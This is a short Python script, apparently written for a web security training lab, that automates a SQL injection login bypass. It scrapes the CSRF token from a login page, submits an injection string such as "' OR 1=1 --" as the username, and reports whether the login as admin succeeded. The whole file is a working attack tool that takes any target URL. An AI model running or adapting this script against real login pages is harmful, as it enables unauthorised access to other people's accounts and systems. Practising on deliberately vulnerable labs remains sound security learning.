import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

def get_csrf_token(session, url):
    response = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input")["value"]
    return csrf_token

def try_sql_injection(session, url, sqli_payload):
    csrf_token = get_csrf_token(session, url)
    form_data = {
        "csrf": csrf_token,
        "username": sqli_payload,
        "password": "password123"
    }
    response = session.post(url, data=form_data, verify=False, proxies=proxies)
    if "Log out" in response.text:
        return True
    else:
        return False

if __name__ == "__main__":
    print("💥 SQL Injection Login Bypass Script 💥\n")

    try:
        target_url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print("❗ Usage: python3 script.py <url> <sqli-payload>")
        print("📌 Example: python3 script.py https://example.com/login \"' OR 1=1 --\"")
        sys.exit(1)

    session = requests.Session()

    if try_sql_injection(session, target_url, sqli_payload):
        print("✅ Success! Logged in as admin using SQL injection.")
    else:
        print("❌ Failed. Try a different payload.")
